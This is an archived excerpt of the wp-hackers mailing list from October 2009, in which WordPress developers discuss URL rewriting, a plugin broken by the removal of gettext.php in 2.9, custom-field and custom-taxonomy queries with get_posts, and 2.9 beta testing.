	<E4E0492A-0A6F-4E26-A9F1-7A7295D80CFF@newclarity.net>
	<1b7f4b94-0659-452a-9ae5-51637c0bc2cc@j9g2000prh.googlegroups.com>
Message-ID: <C05FC20B-0D87-4A89-B161-3F5A8F50E41E@joernroeder.de>

Am 10.10.2009 um 16:03 schrieb Eric Martin <emartin24 at gmail.com>:

> On Oct 9, 11:46 am, Mike Schinkel <mikeschin... at newclarity.net> wrote:
>> Eric,
>>
>> I have a custom plugin I've written for my own use that makes
>> extensive use of URL rewrite.  It's not in a state to be released but
>> is something I could send you if you like.  It powershttp://pm- 
>> sherpa.com
>> .  Email me and I'll forward to you.
>
> I would love to see what you've done.

I would love to see it too...

> I'll shoot you an email.
>
>>
>> BTW, I would not recommend using a colon in your URL like you have. A
>> colon is a reserved character in the URI spec and as such will often
>> get encoded by various softwares (i.e. title%3Adesc instead of
>> title:desc):
>
> I had actually been using the pipe character, but for some reason use
> a colon in my examples. Either way, I appreciate the reminder!
>
> [snip]
>
> -Eric
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

From ezs at evilzenscientist.com  Mon Oct 12 02:39:24 2009
From: ezs at evilzenscientist.com (Evil ZEN Scientist)
Date: Sun, 11 Oct 2009 19:39:24 -0700
Subject: [wp-hackers] 2.9-rare - pomo obsoletes gettext.php and streams.php
	- how-to re-write plugin
Message-ID: <b2c204580910111939x71a32204nf309cfc053e67b45@mail.gmail.com>

Evening all, long time lurker and all that.

I'm testing 2.9 nightly builds - and in the last couple of days a plugin has
stopped working.

The cause is covered in http://core.trac.wordpress.org/ticket/10890

 We now use pomo to parse the translation files so we no longer need the
> php-gettest library
>
> We should remove it and announce it's not there.
>
> We need to remove wp-includes/gettext.php and wp-includes/streams.php
>
My question - how can I fix this no-longer-maintained plugin to use the new
functions?  (It's the old weather icon plugin)

Is there anything graceful that would work with 2.9 and also pre-2.9?

Thanks

ezs

From scribu at gmail.com  Mon Oct 12 06:41:15 2009
From: scribu at gmail.com (scribu)
Date: Mon, 12 Oct 2009 09:41:15 +0300
Subject: [wp-hackers] 2.9-rare - pomo obsoletes gettext.php and
	streams.php - how-to re-write plugin
In-Reply-To: <b2c204580910111939x71a32204nf309cfc053e67b45@mail.gmail.com>
References: <b2c204580910111939x71a32204nf309cfc053e67b45@mail.gmail.com>
Message-ID: <349fe48b0910112341k3362957o345d3e90cae4c3aa@mail.gmail.com>

On Mon, Oct 12, 2009 at 5:39 AM, Evil ZEN Scientist <
ezs at evilzenscientist.com> wrote:

> My question - how can I fix this no-longer-maintained plugin to use the new
> functions?  (It's the old weather icon plugin)
>
> Is there anything graceful that would work with 2.9 and also pre-2.9?
>

The best way is to make it work just with 2.9 and let the old version work
with 2.8.


-- 
http://scribu.net

From lynne.pope at gmail.com  Mon Oct 12 10:11:32 2009
From: lynne.pope at gmail.com (Lynne Pope)
Date: Mon, 12 Oct 2009 23:11:32 +1300
Subject: [wp-hackers] 2.9-rare - pomo obsoletes gettext.php and
	streams.php - how-to re-write plugin
In-Reply-To: <349fe48b0910112341k3362957o345d3e90cae4c3aa@mail.gmail.com>
References: <b2c204580910111939x71a32204nf309cfc053e67b45@mail.gmail.com> 
	<349fe48b0910112341k3362957o345d3e90cae4c3aa@mail.gmail.com>
Message-ID: <427667db0910120311n410afc79k12b1b65117e902b5@mail.gmail.com>

2009/10/12 scribu <scribu at gmail.com>

> On Mon, Oct 12, 2009 at 5:39 AM, Evil ZEN Scientist <
> ezs at evilzenscientist.com> wrote:
>
> > My question - how can I fix this no-longer-maintained plugin to use the
> new
> > functions?  (It's the old weather icon plugin)
> >
> > Is there anything graceful that would work with 2.9 and also pre-2.9?
> >
>
> The best way is to make it work just with 2.9 and let the old version work
> with 2.8.
>

Updating it to work solely with pomo should work with 2.8 too though
shouldn't it? pomo has been in the core for at least a year now.

I guess another alternative would be to include the gettext files with the
plugin.

Lynne

From sharon at BrewerRadio.com  Mon Oct 12 18:40:00 2009
From: sharon at BrewerRadio.com (Sharon Chambers)
Date: Mon, 12 Oct 2009 14:40:00 -0400
Subject: [wp-hackers] advice on custom field post-query
Message-ID: <739e80a0.1ca4b6b.f432d9c.1eb@BrewerRadio.com>

I was hoping to find some advice on how best to achieve what I?m trying to do?
 
I?ve got two custom fields:  _bec_beginning, _bec_expiration
I?m trying now to structure a query that will give me all posts for a date that is within the range of _bec_beginning to _bec_expiration.  What I?m trying is not working:
 
?showposts=$limit&post_type=post&meta_key=_bec_expiration&meta_compare=>=&meta_value=$date&meta_key=_bec_beginning&meta_compare=<=&meta_value=$date?
Where $date is, of course the date in question.
I?m not entirely sure it?s possible to query_posts in this fashion, using two custom fields, and I?m not confident that the meta_compare works quite right either.  
 
I suppose I could write some sql to achieve my goal and query the post table directly, but I would rather use Wordpress method to achieve.  Could use some advice.
 
 
Thanks,
 
Sharon Chambers
Webmaster
brewer media
1305 Carter Street
Chattanooga, TN 37402
(423)242-7652 office
(423)266-2335 fax
Sharon at BrewerMediaGroup.com
Brewer Broadcasting:
Power 94.9 | Groove 93.7 | ESPN Chattanooga 105.1 | Pulse News 95.3 
Brewer Interactive:
BOGONooga.com | ChattanoogaLivesGreen.com | ChattanoogaHasFun.com | ChattanoogaHasCars.com | ChattanoogaHasTravel.com | ChattanoogaCrime.com 
Brewer Publishing:
ChattanoogaPulse.com, The Pulse - Chattanooga's Alternative Weekly Newspaper
Chattanooga Traffic Network:
17 Radio Stations | 3 Television Stations | Traffic Reports & Sponsorships
 

From if.website at gmail.com  Mon Oct 12 18:46:13 2009
From: if.website at gmail.com (Austin Matzko)
Date: Mon, 12 Oct 2009 13:46:13 -0500
Subject: [wp-hackers] advice on custom field post-query
In-Reply-To: <739e80a0.1ca4b6b.f432d9c.1eb@BrewerRadio.com>
References: <739e80a0.1ca4b6b.f432d9c.1eb@BrewerRadio.com>
Message-ID: <674b4a3b0910121146j7f2021bcl5d532116dcbabaec@mail.gmail.com>

On Mon, Oct 12, 2009 at 1:40 PM, Sharon Chambers <sharon at brewerradio.com> wrote:
> I was hoping to find some advice on how best to achieve what I?m trying to do?
>
> I?ve got two custom fields: ?_bec_beginning, _bec_expiration
> I?m trying now to structure a query that will give me all posts for a date that is within the range of _bec_beginning to _bec_expiration. ?What I?m trying is not working:
>
> ?showposts=$limit&post_type=post&meta_key=_bec_expiration&meta_compare=>=&meta_value=$date&meta_key=_bec_beginning&meta_compare=<=&meta_value=$date?
> Where $date is, of course the date in question.
> I?m not entirely sure it?s possible to query_posts in this fashion, using two custom fields, and I?m not confident that the meta_compare works quite right either.

It's not possible currently to query for more than one meta_key/_value
pair using the WP query API alone.

I've done almost the exact same thing you're trying to accomplish by
using the posts_join and posts_where filters to supplement the query
with the extra joins on the postmeta table.

From mikeschinkel at newclarity.net  Mon Oct 12 18:48:46 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Mon, 12 Oct 2009 14:48:46 -0400
Subject: [wp-hackers] Custom permalinks with the Rewrite API
In-Reply-To: <C05FC20B-0D87-4A89-B161-3F5A8F50E41E@joernroeder.de>
References: <738f5882-3202-48d3-9612-d38cf5fc1a87@x25g2000prf.googlegroups.com>
	<E4E0492A-0A6F-4E26-A9F1-7A7295D80CFF@newclarity.net>
	<1b7f4b94-0659-452a-9ae5-51637c0bc2cc@j9g2000prh.googlegroups.com>
	<C05FC20B-0D87-4A89-B161-3F5A8F50E41E@joernroeder.de>
Message-ID: <4C586925-36F6-44CE-99A8-D48D9D390A55@newclarity.net>

Hi Eric & J?rn:

I sent both of you two the plugin and files for the theme in private  
emails.

If you two are interested we could create a google group to discuss  
the plugin so that we could release it into the wild...

-Mike Schinkel
WordPress Custom Plugins
http://mikeschinkel.com/custom-wordpress-plugins/





On Oct 10, 2009, at 10:27 AM, J?rn R?der wrote:

> Am 10.10.2009 um 16:03 schrieb Eric Martin <emartin24 at gmail.com>:
>
>> On Oct 9, 11:46 am, Mike Schinkel <mikeschin... at newclarity.net>  
>> wrote:
>>> Eric,
>>>
>>> I have a custom plugin I've written for my own use that makes
>>> extensive use of URL rewrite.  It's not in a state to be released  
>>> but
>>> is something I could send you if you like.  It powershttp://pm-sherpa.com
>>> .  Email me and I'll forward to you.
>>
>> I would love to see what you've done.
>
> I would love to see it too...
>
>> I'll shoot you an email.
>>
>>>
>>> BTW, I would not recommend using a colon in your URL like you  
>>> have. A
>>> colon is a reserved character in the URI spec and as such will often
>>> get encoded by various softwares (i.e. title%3Adesc instead of
>>> title:desc):
>>
>> I had actually been using the pipe character, but for some reason use
>> a colon in my examples. Either way, I appreciate the reminder!
>>
>> [snip]
>>
>> -Eric
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From scribu at gmail.com  Mon Oct 12 18:51:51 2009
From: scribu at gmail.com (scribu)
Date: Mon, 12 Oct 2009 21:51:51 +0300
Subject: [wp-hackers] advice on custom field post-query
In-Reply-To: <674b4a3b0910121146j7f2021bcl5d532116dcbabaec@mail.gmail.com>
References: <739e80a0.1ca4b6b.f432d9c.1eb@BrewerRadio.com>
	<674b4a3b0910121146j7f2021bcl5d532116dcbabaec@mail.gmail.com>
Message-ID: <349fe48b0910121151x2802a73br256c429e3cae5645@mail.gmail.com>

Try my Custom Field
Taxonomies<http://scribu.net/wordpress/custom-field-taxonomies>plugin
- it can select multiple key-value pairs.

If it doesn't do all that you need, you can at least look in query.php to
see how the SQL is done.


-- 
http://scribu.net

From aaron.jorbin at gmail.com  Mon Oct 12 20:35:10 2009
From: aaron.jorbin at gmail.com (Aaron Jorbin)
Date: Mon, 12 Oct 2009 13:35:10 -0700
Subject: [wp-hackers] get_posts with both a custom post_type and custom
	taxonomy
Message-ID: <21952a280910121335h18737c32i59967125ac211120@mail.gmail.com>

I'm having an issue with get_posts and using a custom post_type and
custom taxonomy.  It seems to always return empty.  If I do
`
$args = array('post_type' => 'my_post_type', 'foo' => 'bar');
$my_posts = get_posts ($args);
`
foo is registered as a registered taxonomy that has query_var set to true.
If I do a custom query for the following, it returns exactly what I
would expect.

`
$sql = "SELECT * from $wpdb->posts
	LEFT JOIN $wpdb->term_relationships ON
$wpdb->term_relationships.object_id = $wpdb->posts.id
	WHERE `$wpdb->posts`.`post_type` = 'my_post_type'
	AND `$wpdb->term_relationships`.`term_taxonomy_id` = $my_term_id
	";

`

Is there an additional step that I am missing?  I opened up a trac
ticket at http://core.trac.wordpress.org/ticket/10934 but haven't
heard any responses there, so perhaps this isn't an actual bug.  Any
help that you can lead would be greatly appreciated.

-Aaron Jorbin

-- 
aaron.jorbin at gmail.com
http://aaron.jorb.in
Twitter: @aaronjorbin

From peter.westwood at ftwr.co.uk  Mon Oct 12 21:09:10 2009
From: peter.westwood at ftwr.co.uk (Peter Westwood)
Date: Mon, 12 Oct 2009 22:09:10 +0100
Subject: [wp-hackers] 2.9-rare - pomo obsoletes gettext.php and
	streams.php - how-to re-write plugin
In-Reply-To: <b2c204580910111939x71a32204nf309cfc053e67b45@mail.gmail.com>
References: <b2c204580910111939x71a32204nf309cfc053e67b45@mail.gmail.com>
Message-ID: <CBF96133-6ADA-42BB-BFB7-2AF22652D963@ftwr.co.uk>


On 12 Oct 2009, at 03:39, Evil ZEN Scientist wrote:

> Evening all, long time lurker and all that.
>
> I'm testing 2.9 nightly builds - and in the last couple of days a  
> plugin has
> stopped working.
>
> The cause is covered in http://core.trac.wordpress.org/ticket/10890
>
> We now use pomo to parse the translation files so we no longer need  
> the
>> php-gettest library
>>
>> We should remove it and announce it's not there.
>>
>> We need to remove wp-includes/gettext.php and wp-includes/streams.php
>>
> My question - how can I fix this no-longer-maintained plugin to use  
> the new
> functions?  (It's the old weather icon plugin)
>
> Is there anything graceful that would work with 2.9 and also pre-2.9?
>

What is the plugin and what gettext functions was it using directly?

WordPress has a clean api for translations and we replaced the  
underlying implementation of those functions without modifying there  
behaviour by replacing there use of gettext with the use of pomo.

If you can link to the plugin I will happily help you get it updated  
to a working state.

westi
-- 
Peter Westwood
http://blog.ftwr.co.uk | http://westi.wordpress.com
C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5


From ezs at evilzenscientist.com  Mon Oct 12 21:15:52 2009
From: ezs at evilzenscientist.com (Evil ZEN Scientist)
Date: Mon, 12 Oct 2009 14:15:52 -0700
Subject: [wp-hackers] 2.9-rare - pomo obsoletes gettext.php and
	streams.php - how-to re-write plugin
In-Reply-To: <CBF96133-6ADA-42BB-BFB7-2AF22652D963@ftwr.co.uk>
References: <b2c204580910111939x71a32204nf309cfc053e67b45@mail.gmail.com>
	<CBF96133-6ADA-42BB-BFB7-2AF22652D963@ftwr.co.uk>
Message-ID: <b2c204580910121415h6108172cr35ab4140a5ecbb15@mail.gmail.com>

http://www.viper007bond.com/wordpress-plugins/discontinued-plugins/weathericon/



On Mon, Oct 12, 2009 at 2:09 PM, Peter Westwood
<peter.westwood at ftwr.co.uk>wrote:

>
> On 12 Oct 2009, at 03:39, Evil ZEN Scientist wrote:
>
>  Evening all, long time lurker and all that.
>>
>> I'm testing 2.9 nightly builds - and in the last couple of days a plugin
>> has
>> stopped working.
>>
>> The cause is covered in http://core.trac.wordpress.org/ticket/10890
>>
>> We now use pomo to parse the translation files so we no longer need the
>>
>>> php-gettest library
>>>
>>> We should remove it and announce it's not there.
>>>
>>> We need to remove wp-includes/gettext.php and wp-includes/streams.php
>>>
>>>  My question - how can I fix this no-longer-maintained plugin to use the
>> new
>> functions?  (It's the old weather icon plugin)
>>
>> Is there anything graceful that would work with 2.9 and also pre-2.9?
>>
>>
> What is the plugin and what gettext functions was it using directly?
>
> WordPress has a clean api for translations and we replaced the underlying
> implementation of those functions without modifying there behaviour by
> replacing there use of gettext with the use of pomo.
>
> If you can link to the plugin I will happily help you get it updated to a
> working state.
>
> westi
> --
> Peter Westwood
> http://blog.ftwr.co.uk | http://westi.wordpress.com
> C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5
>
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From peter.westwood at ftwr.co.uk  Mon Oct 12 21:48:59 2009
From: peter.westwood at ftwr.co.uk (Peter Westwood)
Date: Mon, 12 Oct 2009 22:48:59 +0100
Subject: [wp-hackers] 2.9-rare - pomo obsoletes gettext.php and
	streams.php - how-to re-write plugin
In-Reply-To: <b2c204580910121415h6108172cr35ab4140a5ecbb15@mail.gmail.com>
References: <b2c204580910111939x71a32204nf309cfc053e67b45@mail.gmail.com>
	<CBF96133-6ADA-42BB-BFB7-2AF22652D963@ftwr.co.uk>
	<b2c204580910121415h6108172cr35ab4140a5ecbb15@mail.gmail.com>
Message-ID: <BFEB75E6-94D2-4FD2-8D10-7749C4EF5BB6@ftwr.co.uk>


On 12 Oct 2009, at 22:15, Evil ZEN Scientist wrote:

> http://www.viper007bond.com/wordpress-plugins/discontinued-plugins/weathericon/
>

Ok.  I have had a quick play with the latest version available there.

It seems these are the lines you need to comment out:

# Fixes a bug in l10n.php where some guy decided there was no reason
# to load files which are required for their l10n functions if no
# language is defined in Wordpress.
require_once(ABSPATH . 'wp-includes/streams.php');
require_once(ABSPATH . 'wp-includes/gettext.php');

Looking back through the code history it looks like this issue was  
fixed in WordPress 2.1 - https://core.trac.wordpress.org/ticket/3157

However, the code itself does produce a lot of warnings when run with  
WP_DEBUG enabled it looks like someone needs to take ownership of it  
and bring it up-to-date.

westi
-- 
Peter Westwood
http://blog.ftwr.co.uk | http://westi.wordpress.com
C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5


From peter.westwood at ftwr.co.uk  Mon Oct 12 22:16:29 2009
From: peter.westwood at ftwr.co.uk (Peter Westwood)
Date: Mon, 12 Oct 2009 23:16:29 +0100
Subject: [wp-hackers] Getting involved with the 2.9 beta testing
Message-ID: <36C735A6-5208-4FCC-8DC3-06B03FBD8A88@ftwr.co.uk>

As you may of may not have seen there is a new post on the dev blog on  
this very subject.

I won't repeat everything here but you can read it there - http://wordpress.org/development/2009/10/getting-involved-with-the-2-9-beta-testing/

The short summary is:

2.9 is getting close to beta as we put the final touches on the big  
features we hope to beta by the end of this month.

We need everyone's help to make sure that this is as bug free a  
release as is possible.

During the beta phase we will try and run one or more bug hunt  
sessions and we would love for as many of you as possible to get  
involved.

We hope to release 2.9 around the end of November / beginning of  
December.

If you would like to discus things with us then please join us for our  
weekly meeting on IRC this Thursday 9PM UTC in #wordpress-dev on  
Freenode.

Agenda items can be raised here - http://wpdevel.wordpress.com/2009/10/09/suggest-agenda-items-for-oct-15th-dev-ch/

Cheers

westi
-- 
Peter Westwood
http://blog.ftwr.co.uk | http://westi.wordpress.com
C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5


From leogermani at gmail.com  Mon Oct 12 23:27:45 2009
From: leogermani at gmail.com (Leo germani)
Date: Mon, 12 Oct 2009 20:27:45 -0300
Subject: [wp-hackers] get_posts with both a custom post_type and custom
	taxonomy
In-Reply-To: <21952a280910121335h18737c32i59967125ac211120@mail.gmail.com>
References: <21952a280910121335h18737c32i59967125ac211120@mail.gmail.com>
Message-ID: <32c7967e0910121627s569b813o7205b3371ddc5813@mail.gmail.com>

Hi Aaron,

I often have the same problem when I want a custom query. Thing is some
arguments overwrite the others in this function, and your resulting query is
selecting posts with post type = post.

My workaround is to use the query_posts hook to strip out this condition
from the resulting sql whenever I want.

This is an area where Im not sure wether its a bug or an expected behavior.
But I think if you pass the post_type paramater it should respect it no
matter what other paramaters are passed... Any one agree we could open a
ticket for that? To not let other paramaters overwrite the post_type
paramater?

Leo,,

On Mon, Oct 12, 2009 at 5:35 PM, Aaron Jorbin <aaron.jorbin at gmail.com>wrote:

> I'm having an issue with get_posts and using a custom post_type and
> custom taxonomy.  It seems to always return empty.  If I do
> `
> $args = array('post_type' => 'my_post_type', 'foo' => 'bar');
> $my_posts = get_posts ($args);
> `
> foo is registered as a registered taxonomy that has query_var set to true.
> If I do a custom query for the following, it returns exactly what I
> would expect.
>
> `
> $sql = "SELECT * from $wpdb->posts
>        LEFT JOIN $wpdb->term_relationships ON
> $wpdb->term_relationships.object_id = $wpdb->posts.id
>        WHERE `$wpdb->posts`.`post_type` = 'my_post_type'
>        AND `$wpdb->term_relationships`.`term_taxonomy_id` = $my_term_id
>        ";
>
> `
>
> Is there an additional step that I am missing?  I opened up a trac
> ticket at http://core.trac.wordpress.org/ticket/10934 but haven't
> heard any responses there, so perhaps this isn't an actual bug.  Any
> help that you can lead would be greatly appreciated.
>
> -Aaron Jorbin
>
> --
> aaron.jorbin at gmail.com
> http://aaron.jorb.in
> Twitter: @aaronjorbin
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
leogermani.pirex.com.br
leogermani.estudiolivre.org

From jwriteclub at gmail.com  Tue Oct 13 00:52:29 2009
From: jwriteclub at gmail.com (Christopher O'Connell)
Date: Mon, 12 Oct 2009 17:52:29 -0700
Subject: [wp-hackers] get_posts with both a custom post_type and custom
	taxonomy
In-Reply-To: <32c7967e0910121627s569b813o7205b3371ddc5813@mail.gmail.com>
References: <21952a280910121335h18737c32i59967125ac211120@mail.gmail.com>
	<32c7967e0910121627s569b813o7205b3371ddc5813@mail.gmail.com>
Message-ID: <2E2838FA-4667-46B2-945B-763D8C2609E9@gmail.com>

I agree, it should respect post type. Although, I've been solving this  
with pure SQL.

YMMV

~ Christopher

Sent from my iPhone

On Oct 12, 2009, at 16:27, Leo germani <leogermani at gmail.com> wrote:

> Hi Aaron,
>
> I often have the same problem when I want a custom query. Thing is  
> some
> arguments overwrite the others in this function, and your resulting  
> query is
> selecting posts with post type = post.
>
> My workaround is to use the query_posts hook to strip out this  
> condition
> from the resulting sql whenever I want.
>
> This is an area where Im not sure wether its a bug or an expected  
> behavior.
> But I think if you pass the post_type paramater it should respect it  
> no
> matter what other paramaters are passed... Any one agree we could  
> open a
> ticket for that? To not let other paramaters overwrite the post_type
> paramater?
>
> Leo,,
>
> On Mon, Oct 12, 2009 at 5:35 PM, Aaron Jorbin  
> <aaron.jorbin at gmail.com>wrote:
>
>> I'm having an issue with get_posts and using a custom post_type and
>> custom taxonomy.  It seems to always return empty.  If I do
>> `
>> $args = array('post_type' => 'my_post_type', 'foo' => 'bar');
>> $my_posts = get_posts ($args);
>> `
>> foo is registered as a registered taxonomy that has query_var set  
>> to true.
>> If I do a custom query for the following, it returns exactly what I
>> would expect.
>>
>> `
>> $sql = "SELECT * from $wpdb->posts
>>       LEFT JOIN $wpdb->term_relationships ON
>> $wpdb->term_relationships.object_id = $wpdb->posts.id
>>       WHERE `$wpdb->posts`.`post_type` = 'my_post_type'
>>       AND `$wpdb->term_relationships`.`term_taxonomy_id` =  
>> $my_term_id
>>       ";
>>
>> `
>>
>> Is there an additional step that I am missing?  I opened up a trac
>> ticket at http://core.trac.wordpress.org/ticket/10934 but haven't
>> heard any responses there, so perhaps this isn't an actual bug.  Any
>> help that you can lead would be greatly appreciated.
>>
>> -Aaron Jorbin
>>
>> --
>> aaron.jorbin at gmail.com
>> http://aaron.jorb.in
>> Twitter: @aaronjorbin
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>
>
>
> -- 
> leogermani.pirex.com.br
> leogermani.estudiolivre.org
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

From mikeschinkel at newclarity.net  Tue Oct 13 00:58:02 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Mon, 12 Oct 2009 20:58:02 -0400
Subject: [wp-hackers] get_posts with both a custom post_type and custom
	taxonomy
In-Reply-To: <2E2838FA-4667-46B2-945B-763D8C2609E9@gmail.com>
References: <21952a280910121335h18737c32i59967125ac211120@mail.gmail.com>
	<32c7967e0910121627s569b813o7205b3371ddc5813@mail.gmail.com>
	<2E2838FA-4667-46B2-945B-763D8C2609E9@gmail.com>
Message-ID: <696EF3D2-9646-478B-9CB6-04BC917E88E1@newclarity.net>

I agree that this is a bug and should be fixed.

If a developer sets post_type in $args get_posts() should respect it ,  
not override it.

-Mike Schinkel
WordPress Custom Plugins
http://mikeschinkel.com/custom-wordpress-plugins/


On Oct 12, 2009, at 8:52 PM, Christopher O'Connell wrote:

> I agree, it should respect post type. Although, I've been solving  
> this with pure SQL.
>
> YMMV
>
> ~ Christopher
>
> Sent from my iPhone
>
> On Oct 12, 2009, at 16:27, Leo germani <leogermani at gmail.com> wrote:
>
>> Hi Aaron,
>>
>> I often have the same problem when I want a custom query. Thing is  
>> some
>> arguments overwrite the others in this function, and your resulting  
>> query is
>> selecting posts with post type = post.
>>
>> My workaround is to use the query_posts hook to strip out this  
>> condition
>> from the resulting sql whenever I want.
>>
>> This is an area where Im not sure wether its a bug or an expected  
>> behavior.
>> But I think if you pass the post_type paramater it should respect  
>> it no
>> matter what other paramaters are passed... Any one agree we could  
>> open a
>> ticket for that? To not let other paramaters overwrite the post_type
>> paramater?
>>
>> Leo,,
>>
>> On Mon, Oct 12, 2009 at 5:35 PM, Aaron Jorbin  
>> <aaron.jorbin at gmail.com>wrote:
>>
>>> I'm having an issue with get_posts and using a custom post_type and
>>> custom taxonomy.  It seems to always return empty.  If I do
>>> `
>>> $args = array('post_type' => 'my_post_type', 'foo' => 'bar');
>>> $my_posts = get_posts ($args);
>>> `
>>> foo is registered as a registered taxonomy that has query_var set  
>>> to true.
>>> If I do a custom query for the following, it returns exactly what I
>>> would expect.
>>>
>>> `
>>> $sql = "SELECT * from $wpdb->posts
>>>      LEFT JOIN $wpdb->term_relationships ON
>>> $wpdb->term_relationships.object_id = $wpdb->posts.id
>>>      WHERE `$wpdb->posts`.`post_type` = 'my_post_type'
>>>      AND `$wpdb->term_relationships`.`term_taxonomy_id` =  
>>> $my_term_id
>>>      ";
>>>
>>> `
>>>
>>> Is there an additional step that I am missing?  I opened up a trac
>>> ticket at http://core.trac.wordpress.org/ticket/10934 but haven't
>>> heard any responses there, so perhaps this isn't an actual bug.  Any
>>> help that you can lead would be greatly appreciated.
>>>
>>> -Aaron Jorbin
>>>
>>> --
>>> aaron.jorbin at gmail.com
>>> http://aaron.jorb.in
>>> Twitter: @aaronjorbin
>>> _______________________________________________
>>> wp-hackers mailing list
>>> wp-hackers at lists.automattic.com
>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>
>>
>>
>>
>> -- 
>> leogermani.pirex.com.br
>> leogermani.estudiolivre.org
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From wp-hackers at striderweb.com  Tue Oct 13 02:17:34 2009
From: wp-hackers at striderweb.com (Stephen Rider)
Date: Mon, 12 Oct 2009 21:17:34 -0500
Subject: [wp-hackers] WP plugin hosting without auto-install/update?
Message-ID: <0F8BF97C-C0C2-4B6F-89C2-4E92DA95DFD5@striderweb.com>

Is it possible to host a plugin at WP Extend  but *not* have auto- 
install and auto-update?  I'm considering hosting my Virtual Multiblog  
system on extend, but it is not a standard plugin, and the automatic  
plugin features of extend don't apply.

Update *notices* would be nice, but no auto-update.

Regards,

Stephen

From ezs at evilzenscientist.com  Tue Oct 13 04:21:27 2009
From: ezs at evilzenscientist.com (Evil ZEN Scientist)
Date: Mon, 12 Oct 2009 21:21:27 -0700
Subject: [wp-hackers] 2.9-rare - pomo obsoletes gettext.php and
	streams.php - how-to re-write plugin
In-Reply-To: <BFEB75E6-94D2-4FD2-8D10-7749C4EF5BB6@ftwr.co.uk>
References: <b2c204580910111939x71a32204nf309cfc053e67b45@mail.gmail.com>
	<CBF96133-6ADA-42BB-BFB7-2AF22652D963@ftwr.co.uk>
	<b2c204580910121415h6108172cr35ab4140a5ecbb15@mail.gmail.com>
	<BFEB75E6-94D2-4FD2-8D10-7749C4EF5BB6@ftwr.co.uk>
Message-ID: <b2c204580910122121k7a6eedd5yab00fc103b6b4152@mail.gmail.com>

That simple eh. I'll go look at cleanup too.

Thanks for the pointers.

ezs

On Mon, Oct 12, 2009 at 2:48 PM, Peter Westwood
<peter.westwood at ftwr.co.uk>wrote:

>
> On 12 Oct 2009, at 22:15, Evil ZEN Scientist wrote:
>
>
>> http://www.viper007bond.com/wordpress-plugins/discontinued-plugins/weathericon/
>>
>>
> Ok.  I have had a quick play with the latest version available there.
>
> It seems these are the lines you need to comment out:
>
> # Fixes a bug in l10n.php where some guy decided there was no reason
> # to load files which are required for their l10n functions if no
> # language is defined in Wordpress.
> require_once(ABSPATH . 'wp-includes/streams.php');
> require_once(ABSPATH . 'wp-includes/gettext.php');
>
> Looking back through the code history it looks like this issue was fixed in
> WordPress 2.1 - https://core.trac.wordpress.org/ticket/3157
>
> However, the code itself does produce a lot of warnings when run with
> WP_DEBUG enabled it looks like someone needs to take ownership of it and
> bring it up-to-date.
>
>
> westi
> --
> Peter Westwood
> http://blog.ftwr.co.uk | http://westi.wordpress.com
> C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From scribu at gmail.com  Tue Oct 13 05:27:25 2009
From: scribu at gmail.com (scribu)
Date: Tue, 13 Oct 2009 05:27:25 +0000
Subject: [wp-hackers] WP plugin hosting without auto-install/update?
In-Reply-To: <0F8BF97C-C0C2-4B6F-89C2-4E92DA95DFD5@striderweb.com>
References: <0F8BF97C-C0C2-4B6F-89C2-4E92DA95DFD5@striderweb.com>
Message-ID: <349fe48b0910122227x68438111jf927727c1604eca4@mail.gmail.com>

You can hide the auto-update link from within the plugin.

On 10/13/09, Stephen Rider <wp-hackers at striderweb.com> wrote:
> Is it possible to host a plugin at WP Extend  but *not* have auto-
> install and auto-update?  I'm considering hosting my Virtual Multiblog
> system on extend, but it is not a standard plugin, and the automatic
> plugin features of extend don't apply.
>
> Update *notices* would be nice, but no auto-update.
>
> Regards,
>
> Stephen
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>


-- 
http://scribu.net

From peter.westwood at ftwr.co.uk  Tue Oct 13 06:08:57 2009
From: peter.westwood at ftwr.co.uk (Peter Westwood)
Date: Tue, 13 Oct 2009 07:08:57 +0100
Subject: [wp-hackers] get_posts with both a custom post_type and custom
	taxonomy
In-Reply-To: <696EF3D2-9646-478B-9CB6-04BC917E88E1@newclarity.net>
References: <21952a280910121335h18737c32i59967125ac211120@mail.gmail.com>
	<32c7967e0910121627s569b813o7205b3371ddc5813@mail.gmail.com>
	<2E2838FA-4667-46B2-945B-763D8C2609E9@gmail.com>
	<696EF3D2-9646-478B-9CB6-04BC917E88E1@newclarity.net>
Message-ID: <7D1B85D7-53C6-48B3-A031-1FDAD62ED7F6@ftwr.co.uk>

If I recall correctly this is already fixed for 2.9

--
Peter Westwood
http://peter.westwood.name

On 13 Oct 2009, at 01:58, Mike Schinkel <mikeschinkel at newclarity.net>  
wrote:

> I agree that this is a bug and should be fixed.
>
> If a developer sets post_type in $args get_posts() should respect  
> it , not override it.
>
> -Mike Schinkel
> WordPress Custom Plugins
